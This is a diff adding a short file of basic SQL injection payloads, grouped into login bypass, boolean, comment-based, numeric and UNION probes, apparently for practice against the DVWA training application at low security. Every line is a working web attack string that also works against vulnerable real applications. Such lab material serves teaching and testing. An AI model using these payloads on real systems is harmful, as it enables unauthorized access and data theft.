@@ -1,0 +1,60 @@
+# SQL Injection Payloads – DVWA
+# Purpose: Educational testing only
+
+# -------------------------------
+# BASIC AUTHENTICATION BYPASS
+# -------------------------------
+' OR '1'='1 --
+' OR '1'='1' #
+' OR 1=1 --
+
+# -------------------------------
+# BOOLEAN-BASED SQL INJECTION
+# -------------------------------
+' OR 1=1 #
+' OR 1=0 #
+' AND 1=1 --
+' AND 1=2 --
+
+# -------------------------------
+# COMMENT-BASED PAYLOADS
+# -------------------------------
+admin' --
+admin' #
+admin'/*
+
+# -------------------------------
+# STRING TERMINATION TESTS
+# -------------------------------
+'
+"
+'--
+'#
+
+# -------------------------------
+# NUMERIC SQL INJECTION
+# -------------------------------
+1 OR 1=1
+1 AND 1=1
+1 AND 1=2
+
+# -------------------------------
+# UNION TESTING (BASIC)
+# -------------------------------
+' UNION SELECT NULL --
+' UNION SELECT 1,2 --
+' UNION SELECT user(), database() --
+
+# -------------------------------
+# DVWA LOGIN BYPASS (LOW SECURITY)
+# -------------------------------
+' OR 'a'='a --
+' OR 'x'='x' #
+
+# -------------------------------
+# END OF PAYLOAD LIST
+# -------------------------------
+
+# NOTE:
+# These payloads were tested in DVWA with Security Level set to LOW.
+# Do NOT use against real-world applications.
